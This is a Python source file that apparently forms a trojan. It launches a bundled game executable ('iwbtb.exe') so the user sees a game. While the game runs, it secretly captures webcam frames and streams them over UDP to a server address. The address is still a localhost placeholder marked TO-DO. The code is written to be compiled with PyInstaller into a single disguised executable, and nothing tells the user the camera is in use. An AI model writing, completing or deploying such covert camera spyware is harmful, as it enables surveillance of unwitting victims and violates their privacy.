import subprocess
import threading
import time
import pyautogui
import cv2 as cv
import socket
import sys
import os
import tempfile

udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('localhost', 5000) # TO-DO

def get_cam():
    camera = cv.VideoCapture(0)

    while True:
        status, frame = camera.read()
        if not status:
            break

        # -res = -bytes
        frame = cv.resize(frame, (320, 240))

        _, buffer = cv.imencode('.jpg', frame)
        jpeg_data = buffer.tobytes()

        # ignora pacote astronomico
        if len(jpeg_data) > 60000:
            print(f"Frame muito grande ({len(jpeg_data)} bytes), pulando...")
            continue

        try:
            udp_socket.sendto(jpeg_data, server_address)
        except Exception as e:
            print(f"Erro ao enviar frame: {e}")

        if cv.waitKey(1) & 0xff == ord('q'):
            break

    camera.release()
    udp_socket.close()

def open_game():
    # Quando compilado com PyInstaller, extrair o iwbtb.exe para temp
    if getattr(sys, 'frozen', False):
        # Estamos rodando como executável compilado
        bundle_dir = sys._MEIPASS
        game_path = os.path.join(bundle_dir, 'iwbtb.exe')
        
        # Extrair para temp porque alguns jogos precisam estar em diretório gravável
        temp_dir = tempfile.gettempdir()
        temp_game_path = os.path.join(temp_dir, 'iwbtb.exe')
        
        # Copiar se não existir ou for diferente
        if not os.path.exists(temp_game_path):
            import shutil
            shutil.copy2(game_path, temp_game_path)
        
        subprocess.Popen(temp_game_path)
    else:
        # Desenvolvimento - usar arquivo local
        subprocess.Popen("iwbtb.exe")

if __name__ == "__main__":
    threading.Thread(target=open_game).start()
    get_cam()